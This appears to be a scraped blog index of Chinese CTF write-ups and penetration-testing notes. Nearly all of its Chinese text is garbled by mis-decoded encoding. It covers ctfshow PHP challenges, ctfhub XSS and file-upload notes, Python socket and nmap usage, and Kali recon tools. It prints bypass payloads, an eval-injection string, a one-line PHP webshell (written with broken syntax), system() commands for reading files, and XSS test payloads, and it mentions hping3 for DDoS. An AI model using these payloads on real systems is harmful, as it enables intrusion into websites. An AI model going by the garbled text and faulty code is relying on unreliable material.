æœ‰è®¸å¤šçš„æ–‡æ¡£ï¼Œå¯ä»¥åœ¨è¿™äº›æ–‡æ¡£ä¸­å‘ç°å¾ˆå¤šä¿¡æ¯ï¼Œä¾‹å¦‚æ–‡ä»¶ä¸­æœ‰è®¸å¤šçš„ä¿¡æ¯æ³„éœ²çš„åœ°æ–¹ï¼Œæœ¬é¢˜åœ¨åº•éƒ¨çš„documentè¿™ä¸ªè¿™ä¸ªæ–‡æœ¬ä¸­è®°å½•åˆ°æœ‰åœ°å€å’Œå¯†ç ã€‚\nweb14:æ ¹æ®æç¤º æ³„éœ²é‡è¦(editor)çš„ä¿¡æ¯ ç›´æ¥åœ¨urlåé¢æ·»åŠ /editor ç„¶åæŸ¥çœ‹flagè·¯å¾„å¹¶ä¸”è®¿é—®\nweb15:/admin å¿˜è®°å¯†ç ï¼Œå¯†ä¿é—®é¢˜ã€‚é¦–å…ˆï¼Œåœ¨ç½‘é¡µæœ€ä¸‹æ–¹å‘ç°ä¸€ä¸ªé‚®ç®±ï¼Œäºæ˜¯å°±å»QQä¸Šæœç´¢äº†ä¸€ä¸‹QQå·ï¼Œåªæ˜¯å‘ç°äº†ä¸€ä¸ªè´¦å·ï¼Œåœ°ç‚¹æ˜¯é™•è¥¿è¥¿å®‰ï¼Œç¤¾å·¥æœç´¢ï¼Œtelegramæš—ç²¾çµ\nweb16:è€ƒå¯ŸPHPæ¢é’ˆphpæ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡ æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚ urlåç¼€åæ·»åŠ /tz.php ç‰ˆæœ¬æ˜¯é›…é»‘PHPæ¢é’ˆï¼Œç„¶åæŸ¥çœ‹phpinfoæœç´¢flag\nweb17:/backup.sql å¤‡ä»½çš„sqlæ–‡ä»¶\nweb18:è¿™æ˜¯ä¸€ä¸ªjavascript çš„æ¸¸æˆï¼Œæ¸¸æˆçš„ç›®çš„å°±æ˜¯è®©è¦èµ¢ï¼Œä»jsä»£ç ä¸­å¯çŸ¥ï¼Œå½“score\u0026gt;120æ—¶ï¼Œä¸”game_overè¿™ä¸ªå‚æ•°ä¸ºfalseæ—¶ï¼Œå³å¯èµ¢ï¼Œäºæ˜¯æ‰“å¼€å¼€å‘è€…æ¨¡å¼ä¸­çš„consoleï¼Œç›´æ¥èµ‹å€¼score=130 game_over=false ç„¶åï¼Œæ‰§è¡Œæ¸¸æˆ çš„run() å³å¯å¾—åˆ° \u0026ldquo;ä½ èµ¢äº†ï¼Œå»å¹ºå¹ºé›¶ç‚¹çš®çˆ±åƒçš®çœ‹çœ‹\u0026rdquo;ï¼Œ å³ï¼Œ110.php æ‰“å¼€å®ƒï¼Œå³å¾—flag\nweb19:jsæŸ¥çœ‹æºç ï¼Œå¾—çŸ¥postæäº¤è´¦æˆ·å¯†ç ï¼Œç”¨hackbar\nweb20ï¼šmdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ ç›´æ¥æŸ¥çœ‹urlè·¯å¾„æ·»åŠ /db/db.mdb ä¸‹è½½æ–‡ä»¶é€šè¿‡txtæ‰“å¼€æˆ–è€…é€šè¿‡EasyAccess.exeæ‰“å¼€æœç´¢flag flag{ctfshow_old_database}\nweb89\nisset() ç”¨äºæ£€æŸ¥ $_GET['num'] æ˜¯å¦å­˜åœ¨ã€‚å¦‚æœå˜é‡å­˜åœ¨ä¸”å€¼ä¸ä¸º NULLï¼Œåˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚ preg_match() ç”¨äºæ£€æŸ¥ $_GET['num'] æ˜¯å¦åŒ…å«æ•°å­—å­—ç¬¦ã€‚å¦‚æœæ¨¡å¼åŒ¹é…åˆ°ï¼Œåˆ™è¿”å› 1ï¼Œå¦åˆ™è¿”å› 0ã€‚ intval() ç”¨äºå°† $_GET['num'] è½¬æ¢ä¸ºæ•´æ•°å¹¶æ£€æŸ¥å…¶æ˜¯å¦ä¸ºéé›¶å€¼ã€‚è¿”å›å˜é‡çš„æ•´æ•°å€¼ åˆ©ç”¨æ•°ç»„ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼ï¼Œ?num[]=1\nweb90\nç»•è¿‡åè¿›åˆ¶ï¼Œæˆ‘é‡‡ç”¨è½¬æ¢æˆ16è¿›åˆ¶æ–¹æ³•ï¼Œ?num=0x117c\nweb91\næ­£åˆ™è¡¨è¾¾å¼ä¿®é¥°ç¬¦\n1 /^php$/im /^php$/ï¼šåŒ¹é…å­—ç¬¦ä¸² \u0026ldquo;php\u0026rdquo;ã€‚ iï¼šå¿½ç•¥å¤§å°å†™ã€‚ mï¼šå¤šè¡ŒåŒ¹é…ï¼Œè‹¥å­˜åœ¨æ¢è¡Œ\\nä¸”æœ‰å¼€å§‹^æˆ–ç»“æŸ$ï¼Œä»¥æ¢è¡Œä¸ºåˆ†éš”ç¬¦ï¼Œé€è¡ŒåŒ¹é… 1 %0A` è¡¨ç¤ºæ¢è¡Œç¬¦ï¼ˆ`\\n payloadï¼š?cmd=%0aphp\nweb92\næ–¹æ³•ä¸€:intval()å‡½æ•°å¦‚æœ$baseä¸º0åˆ™$varä¸­å­˜åœ¨å­—æ¯çš„è¯é‡åˆ°å­—æ¯å°±åœæ­¢è¯»å– ä½†æ˜¯eè¿™ä¸ªå­—æ¯æ¯”è¾ƒç‰¹æ®Šï¼Œå¯ä»¥åœ¨PHPä¸­ä¸æ˜¯ç§‘å­¦è®¡æ•°æ³•ã€‚æ‰€ä»¥ä¸ºäº†ç»•è¿‡å‰é¢çš„==4476æˆ‘ä»¬å°±å¯ä»¥æ„é€  4476e123 å…¶å®ä¸éœ€è¦æ˜¯eå…¶ä»–çš„å­—æ¯ä¹Ÿå¯ä»¥\næ–¹æ³•äºŒ:åŒweb90\nweb93\næ—¢ç„¶ä¸èƒ½æœ‰å­—æ¯ï¼Œä¼ æ¢æˆå…«è¿›åˆ¶ï¼Œ?num=010574\nweb94\nåœ¨93çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†å¼€å¤´ä¸º0çš„æ•°å­— è¿™æ ·çš„è¯å°±ä¸èƒ½ä½¿ç”¨è¿›åˆ¶è½¬æ¢æ¥è¿›è¡Œæ“ä½œ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å°æ•°ç‚¹æ¥è¿›è¡Œæ“ä½œã€‚è¿™æ ·é€šè¿‡intval()å‡½æ•°å°±å¯ä»¥å˜ä¸ºintç±»å‹çš„4476 ?num=4476.0\n1 if(!strpos($num, \u0026#34;0\u0026#34;))//0ä¸èƒ½æ”¾åœ¨ç¬¬ä¸€ä½ web95\n1 if(preg_match(\u0026#34;/[a-z]|\\./i\u0026#34;, $num))//ç‚¹åŒ¹é…æ²¡äº† å¯ä»¥é€šè¿‡8è¿›åˆ¶ç»•è¿‡ä½†æ˜¯å‰é¢å¿…é¡»å¤šåŠ ä¸€ä¸ªå­—èŠ‚ ?num=+010574æˆ–è€…?num=%2b010574\nweb96\nåœ¨linuxä¸‹é¢è¡¨ç¤ºå½“å‰ç›®å½•æ˜¯ ./ æ‰€ä»¥æˆ‘ä»¬çš„payloadï¼š u=./flag.php\nä¸èƒ½ç›´æ¥?u=flag.phpä¼šè¢«è¿‡æ»¤\nweb97ï¼ˆè¿™é¢˜ä¸å¤ªæ‡‚å…¶å®ï¼‰\nmd5ç»•è¿‡åŸç†ï¼šmd5å¯¹æ•°ç»„æ˜¯ä¸äºˆåŠ å¯†çš„ï¼Œä½†æ˜¯è¿™ä¸ªå‡½æ•°æ˜¯è¿”å›å€¼ç±»å‹çš„ï¼Œæ²¡æœ‰è¿”å›å¯¹è±¡ï¼Œä¾¿æ˜¯è¿”å›nullï¼ˆnullæ˜¯æ— å¯¹è±¡çš„æ„æ€ï¼Œå¯ä»¥ç†è§£ä¸ºæ²¡æœ‰ç›®æ ‡ï¼‰,æ‰€ä»¥ä¸¤ä¸ªéƒ½æ˜¯nullï¼Œå¯ä»¥ç»•è¿‡é‡Œé¢çš„æ¯”è¾ƒï¼Œä½†æ˜¯å¤–é¢è¿˜æœ‰ä¸€ä¸ªa!=b,ç»•è¿‡å§¿åŠ¿ä¸ºï¼š?a[]=1\u0026amp;b[]=2\nweb98\nä¸‰å…ƒè¿ç®—ç¬¦ï¼Œifä½¿ç”¨\n(expr1)?(expr2)ï¼š(expr3)\nå¦‚æœexpr1æˆç«‹ï¼Œåˆ™æ‰§è¡Œexpr2ï¼Œå¦åˆ™æ‰§è¡Œexpr3\n1 $_GET=\u0026amp;$_POST;//åªè¦æœ‰è¾“å…¥çš„getå‚æ•°å°±å°†getæ–¹æ³•æ”¹å˜ä¸ºpostæ–¹æ³• æˆ‘ä»¬åªéœ€è¦ GETä¸€ä¸ª?HTTP_FLAG=flag åŠ  POSTä¸€ä¸ªHTTP_FLAG=flag,getç›´æ¥urlï¼Ÿï¼Œpostç”¨hackbar\nweb99\nfile_put_contents()å†™å…¥æ–‡ä»¶\n1 å¼±ç±»å‹ä¸­å½“phpå­—ç¬¦ä¸²å’Œintæ¯”è¾ƒæ—¶,å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆintï¼Œæ‰€ä»¥ å­—ç¬¦ä¸²ä¸­æ•°å­—åé¢çš„å­—ç¬¦ä¸²ä¼šè¢«å¿½ç•¥ã€‚é¢˜ç›®ä¸­çš„in_arrayæ²¡æœ‰è®¾ç½®type,æˆ‘ä»¬å¯ä»¥è¾“å…¥å­—ç¬¦ä¸²5.php(æ­¤å¤„æ•°å­—éšæ„ï¼Œåªè¦åœ¨rand(1,0x36d)ä¹‹é—´å³å¯),è½¬æ¢ä¹‹åä¹Ÿå°±æ˜¯5,æ˜æ˜¾æ˜¯åœ¨é¢˜ç›®ä¸­ç”Ÿæˆçš„æ•°ç»„ä¸­çš„,æ»¡è¶³æ¡ä»¶ï¼ŒåŒæ—¶è¿›å…¥ä¸‹ä¸€æ­¥åï¼Œæˆ‘ä»¬å°±å¯å°†ä¸€å¥è¯æœ¨é©¬å†™å…¥äº†5.phpä¸­ get:?n=5.php post:content=\u003c?php @eval=$_POST=['hack'];?\u003e\næŸ¥çœ‹post:content=\u003c?php system('ls');?\u003e ,æŸ¥çœ‹flagï¼šcontent=\u003c?php system('tac flag36d.php');?\u003e\nweb100\nä¸‰ä¸ªå‚æ•° v1 ï¼Œv2 ï¼Œv3ï¼Œå…¶ä¸­v0 å®é™…ä¸Šåªä¼šå»åˆ¤æ–­v1æ˜¯å¦ä¸ºæ•°å­— ï¼Œå› æ­¤v1 = 1234 æ•°å­—å³å¯\n1 2 3 4 5 6 7 8 9 if($v0){ if(!preg_match(\u0026#34;/\\;/\u0026#34;, $v2)){ # è¡¨ç¤ºv2ä¸­ä¸èƒ½æœ‰ç¬¦å· ï¼› if(preg_match(\u0026#34;/\\;/\u0026#34;, $v3)){ #è¡¨ç¤ºv3 ä¸­å¿…é¡»è¦æœ‰ ; eval(\u0026#34;$v2(\u0026#39;ctfshow\u0026#39;)$v3\u0026#34;); # è¿™é‡Œæ˜¯evalä¸­ æ‹¼æ¥v2 v3 } } } v2=var_dump($ctfshow)/* v3=*/; æ‹¼æ¥èµ·æ¥å°±æ˜¯var_dump($ctfshow)/ (\u0026lsquo;ctfshow\u0026rsquo;) / ; å¯ä»¥æ‰§è¡Œ\nv2 ä¹Ÿå¯ä»¥ç”¨å…¶ä»–æ˜¾ç¤ºè¾“å‡ºçš„å‡½æ•°\n1 v2=print_r($ctfshow)/*\u0026amp;v3=*/; æ³¨æ„æ‹¼æ¥ä¹‹åè¦æŠŠv3æ³¨é‡Šæ‰ï¼Œflagè¦æŠŠ02xdæ¢æˆ-\n","date":"2025-02-14T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ctfshow%E9%80%9A%E5%85%B3/","title":"ctfshowé€šå…³"},{"content":"HTTPè¯·æ±‚ï¼šæŠ“åŒ…ï¼ŒæŠŠGETæ¢æˆCTFHUB\n302è·³è½¬ï¼šç½‘é¡µä¸´æ—¶ç§»åŠ¨åˆ°æ–°çš„ä½ç½®ï¼Œè€Œæµè§ˆå™¨çš„ç¼“å­˜æ²¡æœ‰æ›´æ–°ï¼Œflagåœ¨index.phpä¸‹è€Œè·³è½¬åˆ°index.htmlæ‰“å¼€burp suiteæŠ“åŒ…ï¼Œå‘é€è¯·æ±‚\ncookie:éªŒè¯èº«ä»½ æŠ“åŒ…repeateræ¨¡å—æ”¹æˆadmin=1å‘é€è¯·æ±‚\nåŸºç¡€è®¤è¯ï¼šburpsuiteå­—å…¸çˆ†ç ´ï¼ŒåŠ å¯†\nsqlæ³¨å…¥ï¼šç»“åˆburpsuiteï¼ˆå‰ç«¯æ²¡æœ‰å›æ˜¾ï¼‰ï¼Œhackbar\nXSSæ”»å‡» æ‰¾ä¸€ä¸ªxssç½‘ç«™ï¼Œæˆ‘æ‰¾çš„æ˜¯xssaq.com\nåå°„å‹XSS æ¶æ„JavaScriptè„šæœ¬å±äºç”¨æˆ·å‘é€ç»™ç½‘ç«™è¯·æ±‚ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œéšåç½‘ç«™åˆå°†è¿™éƒ¨åˆ†è¿”å›ç»™ç”¨æˆ·ï¼Œæ¶æ„è„šæœ¬åœ¨é¡µé¢ä¸­è¢«æ‰§è¡Œã€‚ä¸€èˆ¬å‘ç”Ÿåœ¨å‰åç«¯ä¸€ä½“çš„åº”ç”¨ä¸­ï¼ŒæœåŠ¡ç«¯é€»è¾‘ä¼šæ”¹å˜æœ€ç»ˆçš„ç½‘é¡µä»£ç ã€‚\næ”»å‡»æ­¥éª¤\n1.æ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„ URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚ 2.ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„ URL æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä» URL ä¸­å–å‡ºï¼Œæ‹¼æ¥åœ¨ HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚ 3.ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚ 4.æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚\nç”±äºHTMLæ–‡æ¡£å…·æœ‰æ‰å¹³çš„ã€ä¸²è¡Œçš„ç»“æ„ï¼Œæ··åˆäº†æ§åˆ¶è¯­å¥ã€æ ¼å¼å’Œå®é™…å†…å®¹ï¼Œå› æ­¤åœ¨ç»“æœé¡µé¢ä¸­åŒ…å«ä»»ä½•æœªç»éªŒè¯çš„ç”¨æˆ·æä¾›çš„æ•°æ®è€Œæ²¡æœ‰è¿›è¡Œæ­£ç¡®çš„HTMLç¼–ç ï¼Œå¯èƒ½å¯¼è‡´æ ‡è®°æ³¨å…¥ã€‚ä¸€ä¸ªç»å…¸çš„æ½œåœ¨æ”»å‡»å‘é‡ä¾‹å­æ˜¯ç«™ç‚¹æœç´¢å¼•æ“ï¼šå¦‚æœç”¨æˆ·æœç´¢ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæœç´¢å­—ç¬¦ä¸²é€šå¸¸ä¼šåœ¨ç»“æœé¡µé¢ä¸Šé€å­—æ˜¾ç¤ºï¼Œä»¥è¡¨æ˜æœç´¢å†…å®¹ã€‚å¦‚æœè¯¥å“åº”æ²¡æœ‰æ­£ç¡®è½¬ä¹‰æˆ–æ‹’ç»HTMLæ§åˆ¶å­—ç¬¦ï¼Œå°±ä¼šå¯¼è‡´è·¨ç«™è„šæœ¬æ¼æ´ã€‚\nåå°„å‹æ”»å‡»é€šå¸¸é€šè¿‡ç”µå­é‚®ä»¶æˆ–ä¸€ä¸ªä¸­ç«‹çš„ç½‘ç«™ä¼ é€’ã€‚è¯±é¥µæ˜¯ä¸€ä¸ªçœ‹ä¼¼æ— å®³çš„URLï¼ŒæŒ‡å‘ä¸€ä¸ªå¯ä¿¡èµ–çš„ç½‘ç«™ï¼Œä½†åŒ…å«XSSæ”»å‡»å‘é‡ã€‚å¦‚æœè¯¥å¯ä¿¡èµ–çš„ç½‘ç«™å¯¹è¯¥å‘é‡å­˜åœ¨æ¼æ´ï¼Œç‚¹å‡»é“¾æ¥å¯èƒ½ä¼šå¯¼è‡´å—å®³è€…çš„æµè§ˆå™¨æ‰§è¡Œæ³¨å…¥çš„è„šæœ¬ã€‚\nè¿™é‡Œç”¨æœ€ç»å…¸çš„paylaodæ¥è¿›è¡Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨xss\n1 \u0026#34;\u0026#34;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026#34;//è¿™æ˜¯è¯­å¥æ˜¯è®©æµè§ˆå™¨å¼¹æ¡† é¢˜ç›®ä¸­ç¬¬äºŒä¸ªè¾“å…¥æ¡†æ¨¡æ‹Ÿå—å®³è€…è®¿é—®ï¼Œè¿™é‡Œçš„payloadéœ€è¦ä»xsså¹³å°ä¸­å¤åˆ¶\nåœ¨XSSç½‘ç«™ä¸Š\nå­˜å‚¨å‹XSS é»‘å®¢å°†æ¶æ„ JavaScript è„šæœ¬é•¿æœŸä¿å­˜åœ¨æœåŠ¡ç«¯æ•°æ®åº“ä¸­ï¼Œç”¨æˆ·ä¸€æ—¦è®¿é—®ç›¸å…³é¡µé¢æ•°æ®ï¼Œæ¶æ„è„šæœ¬å°±ä¼šè¢«æ‰§è¡Œã€‚å¸¸è§äºæœç´¢ã€å¾®åšã€ç¤¾åŒºè´´å§è¯„è®ºç­‰ã€‚ å­˜å‚¨å‹ XSS çš„æ”»å‡»æ­¥éª¤ï¼š\n1.æ”»å‡»è€…å°†æ¶æ„ä»£ç æäº¤åˆ°ç›®æ ‡ç½‘ç«™çš„æ•°æ®åº“ä¸­ã€‚ 2.ç”¨æˆ·æ‰“å¼€ç›®æ ‡ç½‘ç«™æ—¶ï¼Œç½‘ç«™æœåŠ¡ç«¯å°†æ¶æ„ä»£ç ä»æ•°æ®åº“å–å‡ºï¼Œæ‹¼æ¥åœ¨ HTML ä¸­è¿”å›ç»™æµè§ˆå™¨ã€‚ 3.ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œæ··åœ¨å…¶ä¸­çš„æ¶æ„ä»£ç ä¹Ÿè¢«æ‰§è¡Œã€‚ 4.æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚\nå’Œä¸Šé¢çš„æ˜¯ä¸€æ ·çš„ï¼Œå­˜å‚¨å‹å°±æ˜¯æŠŠæ¶æ„ä»£ç å­˜å‚¨è¿›äº†æ•°æ®åº“ï¼Œæ¯æ¬¡æŸ¥åº“å°±ä¼šè§¦å‘æ¶æ„ä»£ç ã€‚\nDOMå‹XSSæ”»å‡» DOM å‹ XSS æ”»å‡»ï¼Œå®é™…ä¸Šå°±æ˜¯ç½‘ç«™å‰ç«¯ JavaScript ä»£ç æœ¬èº«ä¸å¤Ÿä¸¥è°¨ï¼ŒæŠŠä¸å¯ä¿¡çš„æ•°æ®å½“ä½œä»£ç æ‰§è¡Œäº†ã€‚\nåœ¨ä½¿ç”¨ .innerHTMLã€.outerHTMLã€document.write() æ—¶è¦ç‰¹åˆ«å°å¿ƒï¼Œä¸è¦æŠŠä¸å¯ä¿¡çš„æ•°æ®ä½œä¸º HTML æ’åˆ°é¡µé¢ä¸Šï¼Œè€Œåº”å°½é‡ä½¿ç”¨ .textContentã€.setAttribute() ç­‰\nDOM å‹ XSS æ”»å‡»ï¼Œå®é™…ä¸Šå°±æ˜¯ç½‘ç«™å‰ç«¯ JavaScript ä»£ç æœ¬èº«ä¸å¤Ÿä¸¥è°¨ï¼ŒæŠŠä¸å¯ä¿¡çš„æ•°æ®å½“ä½œä»£ç æ‰§è¡Œäº†ã€‚\nåœ¨ä½¿ç”¨ .innerHTMLã€.outerHTMLã€document.write() æ—¶è¦ç‰¹åˆ«å°å¿ƒï¼Œä¸è¦æŠŠä¸å¯ä¿¡çš„æ•°æ®ä½œä¸º HTML æ’åˆ°é¡µé¢ä¸Šï¼Œè€Œåº”å°½é‡ä½¿ç”¨ .textContentã€.setAttribute() ç­‰ DOMå‹XSSçš„æ”»å‡»æ­¥éª¤\næ”»å‡»è€…æ„é€ å‡ºç‰¹æ®Šçš„ URLï¼Œå…¶ä¸­åŒ…å«æ¶æ„ä»£ç ã€‚ ç”¨æˆ·æ‰“å¼€å¸¦æœ‰æ¶æ„ä»£ç çš„ URLã€‚ ç”¨æˆ·æµè§ˆå™¨æ¥æ”¶åˆ°å“åº”åè§£ææ‰§è¡Œï¼Œå‰ç«¯ JavaScript å–å‡º URL ä¸­çš„æ¶æ„ä»£ç å¹¶æ‰§è¡Œã€‚ æ¶æ„ä»£ç çªƒå–ç”¨æˆ·æ•°æ®å¹¶å‘é€åˆ°æ”»å‡»è€…çš„ç½‘ç«™ï¼Œæˆ–è€…å†’å……ç”¨æˆ·çš„è¡Œä¸ºï¼Œè°ƒç”¨ç›®æ ‡ç½‘ç«™æ¥å£æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„æ“ä½œã€‚ ç®€å•æ¥è¯´å°±æ˜¯åœ¨å‰ç«¯é¡µé¢ä¸Šå¯»æ‰¾æ³¨å…¥ç‚¹\né€šè¿‡æ„é€ htmlè¯­æ³•çš„é—­åˆï¼Œå°†è„šæœ¬è¾“å…¥è¿›å»ï¼ŒåŒå‰é¢ä¸€æ ·\nDOMè·³è½¬ å®¡æŸ¥æºä»£ç \næ³¨æ„ï¼å½“ä½ å°†ç±»ä¼¼äº \u0026lsquo;\u0026lsquo;\u0026rsquo;location.href = \u0026ldquo;javascript:alert(\u0026lsquo;xss\u0026rsquo;)\u0026rdquo;\u0026rsquo;\u0026rsquo;\u0026rsquo; è¿™æ ·çš„ä»£ç èµ‹å€¼ç»™ location.href æ—¶ï¼Œæµè§ˆå™¨ä¼šå°†å…¶è§£é‡Šä¸ºä¸€ç§ç‰¹æ®Šçš„URLæ–¹æ¡ˆï¼Œå³ â€œjavascript:â€ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨ä¼šå°†åé¢çš„ JavaScript ä»£ç ä½œä¸ºURLçš„ä¸€éƒ¨åˆ†è¿›è¡Œè§£æï¼Œç„¶åæ‰§è¡Œå®ƒã€‚\nç›´æ¥åœ¨ç½‘é¡µurlåé¢è·Ÿä¸Šä»£ç æµ‹è¯•åå¼¹\n1 \u0026#39;\u0026#39;\u0026#39;javascript:alert(1)\u0026#39;\u0026#39;\u0026#39; è·Ÿå‰é¢è€æ­¥éª¤\næ–‡ä»¶ä¸Šä¼  æ–‡ä»¶ä¸Šä¼ æ¼æ´æœåŠ¡ç«¯ä»£ç æœªå¯¹å®¢æˆ·ç«¯ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯ï¼Œå¯¼è‡´æ¼æ´ã€‚éæ³•ç”¨æˆ·å¯ä»¥åˆ©ç”¨ä¸Šä¼ çš„æ¶æ„æ–‡ä»¶æ§åˆ¶æ•´ä¸ªç½‘ç«™ï¼Œè¿™ä¸ªæ¶æ„æ–‡ä»¶è¢«ç§°ä¸º WebShell ï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºä¸€ç§ç½‘é¡µåé—¨ã€‚ 1.1å¸¸è§çš„WebShellæœ‰å“ªäº›ï¼Ÿ\næ‹¥æœ‰è¾ƒå®Œæ•´åŠŸèƒ½çš„webshellï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°ä¸ºå¤§é©¬ã€‚ åŠŸèƒ½ç®€æ˜“çš„webshellç§°ä¸ºå°é©¬ã€‚ é™¤æ­¤ä¹‹å¤–è¿˜å­˜åœ¨ä¸€å¥è¯æœ¨é©¬ã€èœåˆ€é©¬ã€è„±åº“é©¬ç­‰ç­‰çš„åè¯ï¼Œæ˜¯å¯¹äºwebShellåŠŸèƒ½æˆ–è€…ç‰¹æ€§çš„ç®€ç§°ã€‚ 1.2 ä¸€å¥è¯æœ¨é©¬æ¼”ç¤º\n","date":"2025-02-08T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ctfhub-web/","title":"ctfhub-web"},{"content":"UDP TCP å®¢æˆ·ç«¯ æœåŠ¡å™¨\nsocketå®ä¾‹åŒ– socket(family,type,[protocal])åè®®æ—ï¼ˆé»˜è®¤AF_INET),,SOCK_STREAM(TCP)/SOCK_DGRAM(UDP)\ns=socket.socket()\nåˆå§‹åŒ–TCP:s=socket.socket()\nåˆå§‹åŒ–UDP:s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\nsocketå¸¸ç”¨å‡½æ•° æœåŠ¡å™¨ s.bind((\u0026lsquo;127.0.0.1\u0026rsquo;,2345))ç»‘å®šIPå’Œç«¯å£\ns.listen(5)æœ€å¤§ç›‘å¬5ä¸ªç«¯å£\nconn,address=s.accept()å¥—å­—å¯¹è±¡ï¼Œå®¢æˆ·ç«¯åœ°å€ï¼ˆæœ¬æœºï¼‰\nå®¢æˆ·ç«¯ s.connect((\u0026ldquo;127.0.0.1\u0026rdquo;,2345))\né€šç”¨ send()\nsendall()åŒºåˆ«åœ¨äºå¯ä»¥å®Œæ•´å‘é€TCPæ•°æ®\ns.snedall(bytes(\u0026ldquo;Hello\u0026rdquo;,encoding=\u0026ldquo;utf-8\u0026rdquo;))\nrecv(bufsize)æœ€å¤šå¯ä»¥æ¥å—çš„æ•°é‡\nsendto(string[,flag],address)ä½¿ç”¨UDPæ—¶å‘é€æ•°æ®\nrecovfrom(data,address) UDPä¸“ç”¨ï¼Œæ¥å—æ•°æ®\nclose()å…³é—­socket\nnmapå®ä¾‹åŒ– nm = nmap.PortScannerAsycn()\nå¸¸è§å‡½æ•° scan(self,hosts=\u0026ldquo;127.0.0.1\u0026rdquo;,ports=None,arguments=\u0026quot;-sV\u0026quot;,sudo=False)\nnm.scan(\u0026ldquo;127.0.0.1\u0026rdquo;,\u0026ldquo;1-500\u0026rdquo;,\u0026quot;-sS\u0026quot;)1-500ç«¯å£\nnm.all_hosts()è¿”å›è¢«æ‰«æçš„æ‰€æœ‰ä¸»æœºåˆ—è¡¨\nnm.command_line()è¿”å›å†å½“å‰æ‰«æä¸­ä½¿ç”¨çš„å‘½ä»¤è¡Œ\nnm.csv()è¿”å›è¢«æ‰«æä¸»æœºçš„csvæ ¼å¼çš„æ–‡ä»¶\nprintï¼ˆnm.csv())å¸Œæœ›çœ‹å¾—æ›´æ¸…æ¥š\nnm.has_hsotæ£€æŸ¥æ˜¯å¦æœ‰hostæ‰«æç»“æœï¼Œè¿”å›å€¼ä¸ºfalse/true\nnm.scaninfo()åˆ—å‡ºæ‰«æä¿¡æ¯çš„ç»“æ„\nnmp[\u0026ldquo;192.168.1.101\u0026rdquo;].hostname()è·å–192.168.1.1.1çš„ä¸»æœºå\nstill_scanning()æ˜¯å¦æ­£åœ¨æ‰«æ\nwaitï¼ˆ2ï¼‰ç­‰å¾…æ—¶é—´\nstopï¼ˆï¼‰åœæ­¢å½“å‰æ‰«æ\n","date":"2025-02-08T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/python%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","title":"Pythonæ¸—é€æµ‹è¯•"},{"content":"DNSä¾¦å¯Ÿ DNSMAP DNSæšä¸¾å¹¶ä¿å­˜ä¸ºtxt DNSRecon A:IP MX:é‚®ç®± NS:åç§°æœåŠ¡å™¨ TXT:æ–‡æœ¬ â€‹ IPåœ°å€åå‘æŸ¥è¯¢\nfierce ç›®æ ‡å­åŸŸåå’ŒIP ä¸»æœºæšä¸¾ ATK6 æšä¸¾ä¸»æœºï¼Œå‘ç°æ–°è®¾å¤‡ï¼Œå‘èµ·æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œåˆ©ç”¨å·²çŸ¥æ¼æ´ï¼›æ£€æµ‹å†…ç½‘ä¸­å­˜æ´»çš„IPv6ä¸»æœº\nhping3 å‘é€ICMPè¯·æ±‚ï¼ŒDDoSæ”»å‡»ï¼Œæ‰«æä¸»æœºç«¯å£ï¼ŒFinæ‰«æ\nnmap 6ç§ç«¯å£çŠ¶æ€ï¼Œ\u0026ndash;spoof-mac -ä¼ªé€ nmapæ‰€åœ¨ä¸»æœºåœ°å€ï¼Œ-fåˆ†æ®µå¤„ç†åŠ 